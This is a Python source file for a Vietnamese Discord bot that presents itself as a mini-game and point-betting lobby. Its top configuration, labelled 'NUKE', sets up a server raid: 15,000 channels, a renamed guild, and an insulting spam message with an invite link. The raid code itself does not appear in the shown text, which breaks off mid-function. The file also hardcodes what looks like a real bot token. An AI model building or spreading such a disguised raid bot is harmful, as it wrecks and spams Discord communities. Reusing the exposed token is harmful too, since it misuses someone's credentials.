import discord
from discord import app_commands
import asyncio
import sys
import time
import random
import json
import os
import math

# ===== CẤU HÌNH GỐC (NUKE) =====
TOKEN = "MTU0MjgzNTMxMjY2ODA1NzcwMQ.GAReu9.CGnMV474Wb5zkdSj1GP5O97SCxyorFMpMDrkBc"
OWNER_ID = 1413781843030966345
RAID_NAME = " ҉N҉u҉k҉e҉ ҉D҉i҉s҉c҉o҉r҉d҉ ҉B҉y҉ ҉B҉a҉n҉a҉n҉a҉v҉u҉i҉v҉e҉ "
CHANNEL_COUNT = 15000
BATCH_SIZE = 80
SPAM_LINK = "https://discord.gg/MQ9Zr4H4d"
SPAM_MESSAGE = "***SERVER CỦA CHA NÈ MẤY THẰNG NGU ĐÚ ĐỞN***"
NEW_GUILD_NAME = "👑 𝐍𝐮𝐤𝐞 𝐁𝐲 𝐁𝐚𝐧𝐚𝐧𝐚𝐯𝐮𝐢𝐯𝐞 👑"

# ===== CẤU HÌNH MINI GAME =====
DATA_FILE = "rankings.json"
PLAYERS_FILE = "players.json"
SAVED_INVITE_FILE = "saved_invite.txt"
QUIZ_DURATION = 30
VOTE_DURATION = 10
START_COUNTDOWN = 3
INACTIVITY_TIMEOUT = 60

# ===== QUẢN LÝ NGƯỜI CHƠI =====
def load_players():
    if os.path.exists(PLAYERS_FILE):
        with open(PLAYERS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_players(data):
    with open(PLAYERS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

def reset_players():
    global players
    players = {}
    save_players(players)

players = load_players()

# ===== LƯU LINK MỜI =====
def load_saved_invite():
    if os.path.exists(SAVED_INVITE_FILE):
        with open(SAVED_INVITE_FILE, "r", encoding="utf-8") as f:
            return f.read().strip()
    return None

def save_saved_invite(link):
    with open(SAVED_INVITE_FILE, "w", encoding="utf-8") as f:
        f.write(link)

saved_invite = load_saved_invite()

# ===== HỆ THỐNG RANK (CHỈ DÙNG EMOJI + MÀU) =====
RANK_COLORS = {
    "Đồng": 0xB87333,
    "Bạc": 0xC0C0C0,
    "Vàng": 0xFFD700,
    "Bạch Kim": 0xE5E4E2,
    "Kim Cương": 0xB9F2FF,
    "Tinh Anh": 0x7B68EE,
    "Cao Thủ": 0xFF4500,
    "Đại Pro": 0x9400D3,
    "Vua": 0xFFD700,
    "Người Giàu": 0x008000,
    "Triệu Phú": 0x1E90FF,
    "Tỉ Phú": 0x8B0000,
    "Siêu Tỉ Phú": 0xFF0000
}

RANK_THRESHOLDS = [
    (0, "Đồng", "🥉"),
    (50, "Bạc", "🥈"),
    (100, "Vàng", "🥇"),
    (200, "Bạch Kim", "🍆"),
    (350, "Kim Cương", "💎"),
    (500, "Tinh Anh", "⚔️"),
    (700, "Cao Thủ", "👑"),
    (1000, "Đại Pro", "🔥"),
    (1500, "Vua", "🌟"),
    (5000, "Người Giàu", "💰"),
    (20000, "Triệu Phú", "💎"),
    (50000, "Tỉ Phú", "👑"),
    (100000, "Siêu Tỉ Phú", "🏆")
]

def get_rank(score):
    rank = "Đồng"
    for threshold, name, emoji in RANK_THRESHOLDS:
        if score >= threshold:
            rank = name
    return rank

def get_rank_emoji(rank):
    for threshold, name, emoji in RANK_THRESHOLDS:
        if name == rank:
            return emoji
    return "⭐"

def get_rank_color(rank):
    return RANK_COLORS.get(rank, 0x5865F2)

# ===== LƯU TRỮ ĐIỂM =====
def load_rankings():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_rankings(data):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

rankings = load_rankings()

# ===== CỘNG ĐIỂM =====
def add_points(user_id, points):
    user_id = str(user_id)
    try:
        rankings[user_id] = rankings.get(user_id, 0) + points
        save_rankings(rankings)
        print(f"[+] Added {points} to {user_id}, new score: {rankings[user_id]}")
    except Exception as e:
        print(f"[!] Lỗi add_points: {e}")

# ===== DANH SÁCH MINI GAME =====
MINI_GAMES = {
    "1": {"name": "🎯 Đoán số", "desc": "Đoán số từ 1-100 trong 5 lần", "emoji": "🎯", "mode": "solo"},
    "2": {"name": "🧠 Đố vui", "desc": "Trả lời câu hỏi trắc nghiệm", "emoji": "🧠", "mode": "solo"},
    "3": {"name": "⚡ Tính nhanh", "desc": "Giải phép toán trong 5 giây", "emoji": "⚡", "mode": "solo"},
    "4": {"name": "🎲 Đỏ đen", "desc": "Cược điểm – Đoán đúng màu (Đỏ/Đen)", "emoji": "🎲", "mode": "solo"},
    "5": {"name": "🎲 Tài xỉu", "desc": "Đoán số xúc xắc (1-6) và cược điểm", "emoji": "🎲", "mode": "solo"},
    "6": {"name": "📝 Điền từ", "desc": "Điền từ đúng vào chỗ trống", "emoji": "📝", "mode": "solo"},
    "7": {"name": "🎵 Đoán bài hát", "desc": "Đoán tên bài hát từ lời", "emoji": "🎵", "mode": "solo"},
    "8": {"name": "🏆 Ai nhanh hơn", "desc": "Trả lời nhanh nhất trong 5 giây", "emoji": "🏆", "mode": "solo"},
    "9": {"name": "🧩 Giải đố", "desc": "Giải câu đố logic", "emoji": "🧩", "mode": "solo"},
    "10": {"name": "💪 Thử thách", "desc": "Hoàn thành thử thách ngẫu nhiên", "emoji": "💪", "mode": "solo"},
    "11": {"name": "⚔️ Đấu team", "desc": "Chia 2 đội đấu với nhau", "emoji": "⚔️", "mode": "team"},
    "12": {"name": "🎖️ Solo đấu", "desc": "1vs1 đấu trí", "emoji": "🎖️", "mode": "solo"},
    "13": {"name": "🏎️ Đua xe", "desc": "Cược điểm – Chọn màu xe chiến thắng", "emoji": "🏎️", "mode": "solo"},
}

# ===== GAME INSTRUCTIONS =====
GAME_INSTRUCTIONS = {
    "1": "🎯 **ĐOÁN SỐ**\nĐoán một số từ 1 đến 100. Bạn có 5 lần thử. Mỗi lần đoán đúng được +10 điểm.",
    "2": "🧠 **ĐỐ VUI**\nTrả lời câu hỏi trắc nghiệm. Chọn đáp án đúng để nhận +10 điểm.",
    "3": "⚡ **TÍNH NHANH**\nGiải phép toán trong 5 giây. Trả lời đúng +10 điểm.",
    "4": "🎲 **ĐỎ ĐEN**\nChọn Đỏ hoặc Đen, cược 10 điểm. Đúng +20, sai -10.",
    "5": "🎲 **TÀI XỈU**\nĐoán số xúc xắc (1-6) và cược điểm. Đúng nhận điểm từ người thua.",
    "6": "📝 **ĐIỀN TỪ**\nĐiền từ đúng vào chỗ trống. Đúng +10 điểm.",
    "7": "🎵 **ĐOÁN BÀI HÁT**\nĐoán tên bài hát từ gợi ý. Đúng +10 điểm.",
    "8": "🏆 **AI NHANH HƠN**\nAi trả lời 'tôi' nhanh nhất sẽ thắng +10 điểm.",
    "9": "🧩 **GIẢI ĐỐ**\nGiải câu đố logic. Đúng +10 điểm.",
    "10": "💪 **THỬ THÁCH**\nHoàn thành thử thách ngẫu nhiên để nhận +10 điểm.",
    "11": "⚔️ **ĐẤU TEAM**\nChia 2 đội, đội nào trả lời đúng trước sẽ thắng.",
    "12": "🎖️ **SOLO ĐẤU**\n1vs1, ai trả lời đúng trước sẽ thắng +15 điểm.",
    "13": "🏎️ **ĐUA XE**\nChọn màu xe và cược điểm. Xe nào về đích trước sẽ thắng."
}

# ===== VOTE MINI GAME =====
class VoteView(discord.ui.View):
    def __init__(self, games):
        super().__init__(timeout=VOTE_DURATION)
        self.votes = {}
        self.games = games
        for game_id, game in games.items():
            btn = discord.ui.Button(label=f"{game['emoji']} {game['name']}", custom_id=f"vote_{game_id}", style=discord.ButtonStyle.secondary)
            btn.callback = self.vote_callback
            self.add_item(btn)

    async def vote_callback(self, interaction: discord.Interaction):
        game_id = interaction.data["custom_id"].split("_")[1]
        user_id = str(interaction.user.id)
        if user_id not in self.votes:
            self.votes[user_id] = game_id
            await interaction.response.send_message(f"✅ Bạn đã chọn **{self.games[game_id]['name']}**!", ephemeral=True)
        else:
            await interaction.response.send_message("❌ Bạn đã bỏ phiếu rồi!", ephemeral=True)

# ===== LỚP START =====
class StartView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=INACTIVITY_TIMEOUT)
        self.add_item(discord.ui.Button(label="🎮 Tham gia ngay!", style=discord.ButtonStyle.success, custom_id="join_start"))
        self.add_item(discord.ui.Button(label="▶️ Bắt đầu game!", style=discord.ButtonStyle.primary, custom_id="start_game"))

# ===== HÀM CHẠY MINI GAME =====
async def run_mini_game(channel, game_id):
    game = MINI_GAMES[game_id]
    if game_id in GAME_INSTRUCTIONS:
        await channel.send(GAME_INSTRUCTIONS[game_id])
    
    if game_id == "1":
        await game_guess_number(channel)
    elif game_id == "2":
        await game_quiz(channel)
    elif game_id == "3":
        await game_math_fast(channel)
    elif game_id == "4":
        await game_red_black(channel)
    elif game_id == "5":
        await game_tai_xiu(channel)
    elif game_id == "6":
        await game_fill_word(channel)
    elif game_id == "7":
        await game_guess_song(channel)
    elif game_id == "8":
        await game_quick_respond(channel)
    elif game_id == "9":
        await game_puzzle(channel)
    elif game_id == "10":
        await game_challenge(channel)
    elif game_id == "12":
        await game_solo_duel(channel)
    elif game_id == "13":
        await game_race(channel)
    
    reset_players()

# ===== HÀM CHẠY TEAM GAME =====
async def run_team_game(channel, game_id):
    if game_id == "11":
        await game_team_duel(channel)
    reset_players()

# ===== MINI GAME 1: ĐOÁN SỐ =====
async def game_guess_number(channel):
    number = random.randint(1, 100)
    embed = discord.Embed(title="🎯 ĐOÁN SỐ", description="Đoán số từ 1 đến 100 trong 5 lần!", color=discord.Color.blue())
    await channel.send(embed=embed)
    for attempt in range(5):
        def check(msg):
            return msg.author != client.user and msg.channel == channel and msg.content.isdigit()
        try:
            msg = await client.wait_for('message', timeout=30.0, check=check)
            guess = int(msg.content)
            if guess == number:
                await channel.send(f"✅ **{msg.author.mention}** đoán đúng! Số là {number}. +10 điểm")
                add_points(msg.author.id, 10)
                return
            elif guess < number:
                await channel.send(f"⬆️ Số lớn hơn!")
            else:
                await channel.send(f"⬇️ Số nhỏ hơn!")
        except asyncio.TimeoutError:
            await channel.send(f"⏰ Hết giờ! Số đúng là {number}.")
            return
    await channel.send(f"❌ Hết lượt! Số đúng là {number}.")

# ===== MINI GAME 2: ĐỐ VUI =====
async def game_quiz(channel):
    q = random.choice(QUESTIONS)
    embed = discord.Embed(title="🧠 ĐỐ VUI", description=f"**{q['question']}**\n\nChọn đáp án: {', '.join(q['options'])}", color=discord.Color.green())
    await channel.send(embed=embed)
    def check(msg):
        return msg.author != client.user and msg.channel == channel and msg.content.lower() in [opt.lower() for opt in q['options']]
    try:
        msg = await client.wait_for('message', timeout=30.0, check=check)
        answer = msg.content.lower()
        correct = q['options'][q['answer']].lower()
        if answer == correct:
            await channel.send(f"✅ **{msg.author.mention}** trả lời đúng! +10 điểm")
            add_points(msg.author.id, 10)
        else:
            await channel.send(f"❌ Sai! Đáp án đúng là: **{correct}**")
    except asyncio.TimeoutError:
        await channel.send(f"⏰ Hết giờ! Đáp án đúng là: **{correct}**")

# ===== MINI GAME 3: TÍNH NHANH =====
async def game_math_fast(channel):
    a, b = random.randint(1, 20), random.randint(1, 20)
    op = random.choice(['+', '-', '*'])
    if op == '+': result = a + b
    elif op == '-': result = a - b
    else: result = a * b
    embed = discord.Embed(title="⚡ TÍNH NHANH", description=f"**{a} {op} {b} = ?**\n\nTrả lời trong 5 giây!", color=discord.Color.orange())
    await channel.send(embed=embed)
    def check(msg):
        return msg.author != client.user and msg.channel == channel and msg.content.isdigit()
    try:
        msg = await client.wait_for('message', timeout=5.0, check=check)
        if int(msg.content) == result:
            await channel.send(f"✅ **{msg.author.mention}** trả lời đúng! +10 điểm")
            add_points(msg.author.id, 10)
        else:
            await channel.send(f"❌ Sai! Đáp án đúng là: **{result}**")
    except asyncio.TimeoutError:
        await channel.send(f"⏰ Hết giờ! Đáp án đúng là: **{result}**")

# ===== MINI GAME 4: ĐỎ ĐEN =====
async def game_red_black(channel):
    colors = ["Đỏ", "Đen"]
    result = random.choice(colors)
    embed = discord.Embed(title="🎲 ĐỎ ĐEN", description="Chọn **Đỏ** hoặc **Đen**. Cược 10 điểm!\nNếu đúng bạn nhận +20 điểm, sai mất 10 điểm.", color=discord.Color.red())
    await channel.send(embed=embed)
    def check(msg):
        return msg.author != client.user and msg.channel == channel and msg.content.lower() in ['đỏ', 'đen']
    try:
        msg = await client.wait_for('message', timeout=30.0, check=check)
        bet = msg.content.lower()
        user_id = str(msg.author.id)
        if bet == result.lower():
            add_points(msg.author.id, 20)
            await channel.send(f"🎉 **{msg.author.mention}** thắng! Kết quả: {result}. +20 điểm")
        else:
            old = rankings.get(user_id, 0)
            rankings[user_id] = max(0, old - 10)
            save_rankings(rankings)
            await channel.send(f"💀 **{msg.author.mention}** thua! Kết quả: {result}. -10 điểm")
    except asyncio.TimeoutError:
        await channel.send(f"⏰ Hết giờ!")

# ===== MINI GAME 5: TÀI XỈU =====
ready_users = set()

async def game_tai_xiu(channel):
    global ready_users
    ready_users = set()
    player_ids = list(players.keys())
    if len(player_ids) < 2:
        await channel.send("❌ Cần ít nhất 2 người để chơi!")
        return

    embed = discord.Embed(
        title="🎲 TÀI XỈU - ĐOÁN ĐIỂM XÚC XẮC",
        description="📖 **HƯỚNG DẪN**\n"
                    "1️⃣ Mỗi người chọn **SẴN SÀNG** để tham gia.\n"
                    "2️⃣ Bot sẽ tung xúc xắc (1-6).\n"
                    "3️⃣ Bạn có **10 giây** để dự đoán số điểm.\n"
                    "4️⃣ Nhập: `số_dự_đoán số_điểm_cược` (ví dụ: `5 50`).\n"
                    "5️⃣ Cược tối thiểu **10 điểm**.\n"
                    "6️⃣ Nếu đúng → nhận điểm, sai → mất điểm.",
        color=discord.Color.blue()
    )
    await channel.send(embed=embed)

    class ReadyView(discord.ui.View):
        def __init__(self):
            super().__init__(timeout=30)
            self.add_item(discord.ui.Button(label="✅ SẴN SÀNG", style=discord.ButtonStyle.success, custom_id="ready_tai_xiu"))

    view = ReadyView()
    await channel.send("⏳ Bấm **SẴN SÀNG** để tham gia!", view=view)
    await asyncio.sleep(30)

    if len(ready_users) < 2:
        await channel.send("❌ Không đủ người sẵn sàng! Hủy game.")
        return

    dice_result = random.randint(1, 6)
    await channel.send(f"🎲 **Xúc xắc đã được tung!** Bạn có 10 giây để dự đoán số điểm.")

    predictions = {}
    def check(msg):
        return msg.author.id in [int(uid) for uid in ready_users] and msg.channel == channel

    start_time = time.time()
    timeout = 10
    while time.time() - start_time < timeout:
        try:
            msg = await client.wait_for('message', timeout=1.0, check=check)
            parts = msg.content.split()
            if len(parts) != 2:
                await msg.author.send("❌ Sai cú pháp! Hãy nhập: `5 50`")
                continue

            try:
                guess = int(parts[0])
                bet_amount = int(parts[1])
            except:
                await msg.author.send("❌ Vui lòng nhập số!")
                continue

            if guess < 1 or guess > 6:
                await msg.author.send("❌ Số điểm dự đoán phải từ 1 đến 6!")
                continue

            if bet_amount < 10:
                await msg.author.send("❌ Số điểm cược tối thiểu là 10!")
                continue

            user_id = str(msg.author.id)
            current_score = rankings.get(user_id, 0)
            if bet_amount > current_score:
                await msg.author.send(f"❌ Bạn chỉ có **{current_score}** điểm!")
                continue

            predictions[user_id] = {"guess": guess, "amount": bet_amount}
            await msg.author.send(f"✅ Bạn đã cược **{bet_amount}** điểm vào số **{guess}**!")

        except asyncio.TimeoutError:
            continue

    if not predictions:
        await channel.send("❌ Không có ai đặt cược! Hủy game.")
        return

    await channel.send(f"🎲 **Kết quả xúc xắc: {dice_result}**")

    winners = [uid for uid, pred in predictions.items() if pred["guess"] == dice_result]
    losers = [uid for uid, pred in predictions.items() if pred["guess"] != dice_result]

    if not winners:
        await channel.send("❌ Không ai đoán đúng! Tất cả mất điểm.")
        for uid, pred in predictions.items():
            old = rankings.get(uid, 0)
            rankings[uid] = max(0, old - pred["amount"])
            save_rankings(rankings)
        return

    total_lost = sum(predictions[uid]["amount"] for uid in losers)
    win_amount = total_lost // len(winners)

    for uid in winners:
        old = rankings.get(uid, 0)
        rankings[uid] = old + win_amount
        save_rankings(rankings)

    for uid in losers:
        old = rankings.get(uid, 0)
        rankings[uid] = max(0, old - predictions[uid]["amount"])
        save_rankings(rankings)

    result_msg = "📊 **KẾT QUẢ CƯỢC**\n"
    for uid, pred in predictions.items():
        try:
            user = await client.fetch_user(int(uid))
            name = user.display_name
        except:
            name = uid
        status = "✅ THẮNG" if uid in winners else "❌ THUA"
        new_score = rankings.get(uid, 0)
        result_msg += f"{name}: {status} | Dự đoán: {pred['guess']} | Cược: {pred['amount']} | Điểm mới: {new_score}\n"

    await channel.send(result_msg)

# ===== MINI GAME 6: ĐIỀN TỪ =====
async def game_fill_word(channel):
    words = ["Minecraft", "Discord", "Python", "Roblox", "Java"]
    word = random.choice(words)
    hidden = word[0] + "_" * (len(word)-2) + word[-1]
    embed = discord.Embed(title="📝 ĐIỀN TỪ", description=f"Từ: **{hidden}**\nNhập từ đúng!", color=discord.Color.purple())
    await channel.send(embed=embed)
    def check(msg):
        return msg.author != client.user and msg.channel == channel
    try:
        msg = await client.wait_for('message', timeout=30.0, check=check)
        if msg.content.lower() == word.lower():
            await channel.send(f"✅ **{msg.author.mention}** điền đúng! +10 điểm")
            add_points(msg.author.id, 10)
        else:
            await channel.send(f"❌ Sai! Từ đúng là: **{word}**")
    except asyncio.TimeoutError:
        await channel.send(f"⏰ Hết giờ! Từ đúng là: **{word}**")

# ===== MINI GAME 7: ĐOÁN BÀI HÁT =====
async def game_guess_song(channel):
    songs = {"Shape of You": "Một ca khúc của Ed Sheeran",
             "Bohemian Rhapsody": "Ca khúc của Queen",
             "Baby": "Ca khúc của Justin Bieber"}
    song, hint = random.choice(list(songs.items()))
    embed = discord.Embed(title="🎵 ĐOÁN BÀI HÁT", description=f"Gợi ý: {hint}\nĐoán tên bài hát!", color=discord.Color.magenta())
    await channel.send(embed=embed)
    def check(msg):
        return msg.author != client.user and msg.channel == channel
    try:
        msg = await client.wait_for('message', timeout=30.0, check=check)
        if msg.content.lower() == song.lower():
            await channel.send(f"✅ **{msg.author.mention}** đoán đúng! +10 điểm")
            add_points(msg.author.id, 10)
        else:
            await channel.send(f"❌ Sai! Bài hát là: **{song}**")
    except asyncio.TimeoutError:
        await channel.send(f"⏰ Hết giờ! Bài hát là: **{song}**")

# ===== MINI GAME 8: AI NHANH HƠN =====
async def game_quick_respond(channel):
    embed = discord.Embed(title="🏆 AI NHANH HƠN", description="Ai trả lời **'tôi'** nhanh nhất sẽ thắng!", color=discord.Color.gold())
    await channel.send(embed=embed)
    def check(msg):
        return msg.author != client.user and msg.channel == channel and msg.content.lower() == "tôi"
    try:
        msg = await client.wait_for('message', timeout=5.0, check=check)
        await channel.send(f"🏆 **{msg.author.mention}** thắng! +10 điểm")
        add_points(msg.author.id, 10)
    except asyncio.TimeoutError:
        await channel.send("⏰ Không ai trả lời!")

# ===== MINI GAME 9: GIẢI ĐỐ =====
async def game_puzzle(channel):
    puzzles = ["Cái gì càng lau càng bẩn?", "Quả gì không ăn được?"]
    answer = ["bảng đen", "quả đấm"]
    idx = random.randint(0, len(puzzles)-1)
    embed = discord.Embed(title="🧩 GIẢI ĐỐ", description=puzzles[idx], color=discord.Color.cyan())
    await channel.send(embed=embed)
    def check(msg):
        return msg.author != client.user and msg.channel == channel
    try:
        msg = await client.wait_for('message', timeout=30.0, check=check)
        if msg.content.lower() == answer[idx]:
            await channel.send(f"✅ **{msg.author.mention}** giải đố đúng! +10 điểm")
            add_points(msg.author.id, 10)
        else:
            await channel.send(f"❌ Sai! Đáp án là: **{answer[idx]}**")
    except asyncio.TimeoutError:
        await channel.send(f"⏰ Hết giờ! Đáp án là: **{answer[idx]}**")

# ===== MINI GAME 10: THỬ THÁCH =====
async def game_challenge(channel):
    challenges = ["Hát một bài hát", "Kể một câu chuyện cười", "Nói một câu tiếng Anh"]
    challenge = random.choice(challenges)
    embed = discord.Embed(title="💪 THỬ THÁCH", description=f"Thử thách: **{challenge}**\nHoàn thành để nhận +10 điểm!", color=discord.Color.red())
    await channel.send(embed=embed)
    def check(msg):
        return msg.author != client.user and msg.channel == channel
    try:
        msg = await client.wait_for('message', timeout=60.0, check=check)
        await channel.send(f"🎉 **{msg.author.mention}** hoàn thành thử thách! +10 điểm")
        add_points(msg.author.id, 10)
    except asyncio.TimeoutError:
        await channel.send("⏰ Không ai hoàn thành thử thách!")

# ===== MINI GAME 11: ĐẤU TEAM =====
async def game_team_duel(channel):
    player_ids = list(players.keys())
    if len(player_ids) < 2:
        await channel.send("❌ Cần ít nhất 2 người để chơi team!")
        return

    random.shuffle(player_ids)
    team1 = player_ids[:len(player_ids)//2]
    team2 = player_ids[len(player_ids)//2:]

    team1_mentions = ", ".join([f"<@{uid}>" for uid in team1])
    team2_mentions = ", ".join([f"<@{uid}>" for uid in team2])

    embed = discord.Embed(
        title="⚔️ **ĐẤU TEAM** ⚔️",
        description=f"**Đội 1:** {team1_mentions}\n**Đội 2:** {team2_mentions}\n\nHãy thi đấu để giành chiến thắng!",
        color=discord.Color.red()
    )
    await channel.send(embed=embed)

    q = random.choice(QUESTIONS)
    embed_q = discord.Embed(
        title="❓ **Câu hỏi dành cho cả 2 đội**",
        description=f"**{q['question']}**\n\nĐội nào trả lời đúng trước sẽ thắng!",
        color=discord.Color.blue()
    )
    await channel.send(embed=embed_q)

    def check(msg):
        return msg.author.id in [int(uid) for uid in player_ids] and msg.channel == channel

    try:
        msg = await client.wait_for('message', timeout=30.0, check=check)
        answer = msg.content.lower()
        correct = q['options'][q['answer']].lower()
        if answer == correct:
            if str(msg.author.id) in team1:
                await channel.send(f"🎉 **Đội 1** trả lời đúng! +10 điểm cho toàn đội!")
                for uid in team1:
                    add_points(uid, 10)
            else:
                await channel.send(f"🎉 **Đội 2** trả lời đúng! +10 điểm cho toàn đội!")
                for uid in team2:
                    add_points(uid, 10)
        else:
            await channel.send(f"❌ Sai! Đáp án đúng là: **{correct}**")
    except asyncio.TimeoutError:
        await channel.send(f"⏰ Hết giờ! Đáp án đúng là: **{correct}**")

# ===== MINI GAME 12: SOLO ĐẤU =====
async def game_solo_duel(channel):
    player_ids = list(players.keys())
    if len(player_ids) < 2:
        await channel.send("❌ Cần ít nhất 2 người để solo đấu!")
        return

    p1, p2 = random.sample(player_ids, 2)
    embed = discord.Embed(
        title="🎖️ **SOLO ĐẤU** 🎖️",
        description=f"<@{p1}> vs <@{p2}>\nAi trả lời đúng trước sẽ thắng!",
        color=discord.Color.gold()
    )
    await channel.send(embed=embed)

    q = random.choice(QUESTIONS)
    embed_q = discord.Embed(
        title="❓ **Câu hỏi**",
        description=f"**{q['question']}**",
        color=discord.Color.blue()
    )
    await channel.send(embed=embed_q)

    def check(msg):
        return msg.author.id in [int(p1), int(p2)] and msg.channel == channel

    try:
        msg = await client.wait_for('message', timeout=30.0, check=check)
        answer = msg.content.lower()
        correct = q['options'][q['answer']].lower()
        if answer == correct:
            await channel.send(f"🎉 **{msg.author.mention}** thắng! +15 điểm")
            add_points(msg.author.id, 15)
        else:
            await channel.send(f"❌ Sai! Đáp án đúng là: **{correct}**")
    except asyncio.TimeoutError:
        await channel.send(f"⏰ Hết giờ! Đáp án đúng là: **{correct}**")

# ===== MINI GAME 13: ĐUA XE =====
async def game_race(channel):
    player_ids = list(players.keys())
    if len(player_ids) < 2:
        await channel.send("❌ Cần ít nhất 2 người để đua xe!")
        return

    colors = ["🔴 Đỏ", "🔵 Xanh", "🟢 Xanh lá", "🟡 Vàng", "🟣 Tím", "⚫ Đen"]
    embed = discord.Embed(
        title="🏎️ ĐUA XE - CƯỢC ĐIỂM",
        description="📖 **HƯỚNG DẪN**\n"
                    "1️⃣ Chọn màu xe và nhập số điểm cược.\n"
                    "2️⃣ Ví dụ: `Đỏ 50` hoặc `Xanh 20`.\n"
                    "3️⃣ Cược tối thiểu **10 điểm**.\n"
                    "4️⃣ Xe sẽ chạy và về đích – ai chọn đúng màu sẽ thắng!\n"
                    f"🎨 Các màu: {', '.join(colors)}",
        color=discord.Color.blue()
    )
    await channel.send(embed=embed)

    bets = {}
    def check(msg):
        return msg.author.id in [int(uid) for uid in player_ids] and msg.channel == channel

    start_time = time.time()
    timeout = 30
    while time.time() - start_time < timeout:
        try:
            msg = await client.wait_for('message', timeout=1.0, check=check)
            parts = msg.content.split()
            if len(parts) != 2:
                await msg.author.send("❌ Sai cú pháp! Hãy nhập: `Đỏ 50` hoặc `Xanh 20`")
                continue

            color = parts[0].lower()
            try:
                bet_amount = int(parts[1])
            except:
                await msg.author.send("❌ Số điểm cược không hợp lệ!")
                continue

            if bet_amount < 10:
                await msg.author.send("❌ Số điểm cược tối thiểu là 10!")
                continue

            user_id = str(msg.author.id)
            current_score = rankings.get(user_id, 0)
            if bet_amount > current_score:
                await msg.author.send(f"❌ Bạn chỉ có **{current_score}** điểm!")
                continue

            color_map = {"đỏ": "🔴 Đỏ", "xanh": "🔵 Xanh", "xanh lá": "🟢 Xanh lá", "vàng": "🟡 Vàng", "tím": "🟣 Tím", "đen": "⚫ Đen"}
            if color not in color_map:
                await msg.author.send("❌ Màu không hợp lệ! Chọn: Đỏ, Xanh, Xanh lá, Vàng, Tím, Đen")
                continue

            bets[user_id] = {"color": color_map[color], "amount": bet_amount}
            await msg.author.send(f"✅ Bạn đã cược **{bet_amount}** điểm vào xe màu **{color_map[color]}**!")

        except asyncio.TimeoutError:
            continue

    if not bets:
        await channel.send("❌ Không có ai đặt cược! Hủy game.")
        return

    race_msg = await channel.send("🏎️ **ĐUA XE BẮT ĐẦU!**")
    winner_color = random.choice(colors)
    
    for i in range(5, 0, -1):
        animation = ""
        for color in colors:
            if color == winner_color:
                animation += f"{color} 🚀\n"
            else:
                animation += f"{color} 🏁\n"
        await race_msg.edit(content=f"🏎️ **ĐUA XE**\n{animation}\n⏳ Còn **{i}** giây...")
        await asyncio.sleep(1)

    await channel.send(f"🏆 **Xe màu {winner_color} về đích!**")

    winners = [uid for uid, bet in bets.items() if bet["color"] == winner_color]
    losers = [uid for uid, bet in bets.items() if bet["color"] != winner_color]

    if not winners:
        await channel.send("❌ Không ai thắng! Tất cả mất điểm.")
        for uid, bet in bets.items():
            old = rankings.get(uid, 0)
            rankings[uid] = max(0, old - bet["amount"])
            save_rankings(rankings)
        return

    total_lost = sum(bets[uid]["amount"] for uid in losers)
    win_amount = total_lost // len(winners)

    for uid in winners:
        old = rankings.get(uid, 0)
        rankings[uid] = old + win_amount
        save_rankings(rankings)

    for uid in losers:
        old = rankings.get(uid, 0)
        rankings[uid] = max(0, old - bets[uid]["amount"])
        save_rankings(rankings)

    result_msg = "📊 **KẾT QUẢ CƯỢC**\n"
    for uid, bet in bets.items():
        try:
            user = await client.fetch_user(int(uid))
            name = user.display_name
        except:
            name = uid
        status = "✅ THẮNG" if uid in winners else "❌ THUA"
        new_score = rankings.get(uid, 0)
        result_msg += f"{name}: {status} | Màu: {bet['color']} | Cược: {bet['amount']} | Điểm mới: {new_score}\n"

    await channel.send(result_msg)

# ===== CÂU HỎI =====
QUESTIONS = [
    {"question": "Thủ đô của Việt Nam là?", "options": ["Hà Nội", "TP.HCM", "Đà Nẵng", "Hải Phòng"], "answer": 0},
    {"question": "2 + 2 = ?", "options": ["3", "4", "5", "6"], "answer": 1},
    {"question": "Màu sắc nào là màu của lá cây?", "options": ["Đỏ", "Xanh lá", "Vàng", "Tím"], "answer": 1},
    {"question": "Con vật nào được gọi là vua của rừng xanh?", "options": ["Hổ", "Sư tử", "Voi", "Báo"], "answer": 1},
    {"question": "Hành tinh nào gần mặt trời nhất?", "options": ["Sao Kim", "Sao Thủy", "Trái Đất", "Sao Hỏa"], "answer": 1},
    {"question": "Nước nào có diện tích lớn nhất thế giới?", "options": ["Trung Quốc", "Hoa Kỳ", "Nga", "Canada"], "answer": 2},
    {"question": "Nguyên tố hóa học nào có ký hiệu O?", "options": ["Oxy", "Oganesson", "Osmium", "Oxygenium"], "answer": 0},
    {"question": "Ai là tác giả của 'Truyện Kiều'?", "options": ["Nguyễn Du", "Hồ Xuân Hương", "Nguyễn Đình Chiểu", "Tản Đà"], "answer": 0},
    {"question": "Động vật nào có cổ dài nhất?", "options": ["Hươu cao cổ", "Lạc đà", "Ngựa", "Voi"], "answer": 0},
    {"question": "Máy tính sử dụng hệ đếm nào?", "options": ["Thập phân", "Nhị phân", "Thập lục phân", "Bát phân"], "answer": 1},
]

# ===== KHỞI TẠO CLIENT VÀ TREE =====
intents = discord.Intents.all()
client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)

# ===== LỆNH START =====
@tree.command(name="start", description="🎮 Mở sảnh game – tham gia và bắt đầu")
async def slash_start(interaction: discord.Interaction):
    if not interaction.guild:
        await interaction.response.send_message("❌ Lệnh này chỉ dùng trong server!", ephemeral=True)
        return

    reset_players()

    player_list = "\n".join([f"👤 {name}" for name in players.values()]) if players else "Chưa có ai tham gia"
    embed = discord.Embed(
        title="🎮 **SẢNH GAME - BANANAVUIVE** 🎮",
        description=f"⏳ Nhấn **Tham gia ngay!** để vào game.\n"
                    f"👥 Số người đã tham gia: **{len(players)}**\n"
                    f"📋 **Danh sách:**\n{player_list}\n"
                    "▶️ Nhấn **Bắt đầu game!** để bắt đầu vote.",
        color=discord.Color.blue()
    )
    view = StartView()
    await interaction.response.send_message(embed=embed, view=view)

# ===== XỬ LÝ BUTTON =====
@client.event
async def on_interaction(interaction: discord.Interaction):
    if interaction.type != discord.InteractionType.component:
        return

    custom_id = interaction.data.get("custom_id")
    
    if custom_id == "join_start":
        try:
            global players
            players = load_players()
            user_id = str(interaction.user.id)
            if user_id not in players:
                players[user_id] = interaction.user.name
                save_players(players)
                embed = interaction.message.embeds[0]
